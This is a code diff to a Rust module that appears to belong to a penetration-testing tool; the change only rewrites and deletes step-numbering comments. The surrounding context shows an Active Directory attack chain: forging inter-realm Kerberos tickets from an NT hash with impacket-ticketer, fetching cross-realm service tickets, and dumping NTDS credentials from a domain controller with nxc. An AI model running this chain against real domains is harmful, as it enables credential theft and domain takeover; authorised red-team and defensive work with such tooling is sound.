@@ -178,9 +178,9 @@ pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
         let _ = std::fs::rename(&default_ccache, &ccache_path);
     }
 
-    // Optional Step 2: chain cross_realm_tgs.py to fetch ldap/<dc> and
-    // cifs/<dc> service tickets and append them to the same ccache. This
-    // turns the otherwise-unusable inter-realm TGT into a ccache that
+    // Optionally chain cross_realm_tgs.py to fetch ldap/<dc> and cifs/<dc>
+    // service tickets and append them to the same ccache. This turns the
+    // otherwise-unusable inter-realm TGT into a ccache that
     // `ldapsearch -Y GSSAPI` can consume directly.
     if ccache_path.exists() {
         if let (Some(dc_fqdn), Some(dc_ip)) = (target_dc_fqdn, target_dc_ip) {
@@ -291,7 +291,6 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
     let tempdir = tempfile::tempdir().context("failed to create tempdir for inter-realm forge")?;
     let cwd = tempdir.path().to_path_buf();
 
-    // --- Step 1: forge inter-realm TGT (NT-only) ---
     let krbtgt_spn = format!("krbtgt/{target_domain}");
     let mut ticketer = CommandBuilder::new("impacket-ticketer")
         .flag("-nthash", nt)
@@ -320,8 +319,6 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    // --- Step 2: cross-realm TGS via embedded helper ---
-    //
     // Write the helper to the tempdir and invoke it. The helper opens the
     // forged inter-realm TGT, calls `getKerberosTGS` directly against the
     // target KDC, and writes the resulting TGS to a new ccache. See the
@@ -369,10 +366,8 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    // --- Step 3: nxc smb --ntds via the TGS ccache ---
-    //
     // The cached TGS is bound to `cifs/{target}` where `target` is the FQDN
-    // baked into the ticket by step 2. nxc auto-builds its SPN from the
+    // baked into the ticket by the cross-realm helper. nxc auto-builds its SPN from the
     // command-line target, so we MUST pass the FQDN here — passing the IP
     // would make nxc look up `cifs/<IP>` in the cache, miss, and silently
     // fall through with exit 0 / empty stdout.
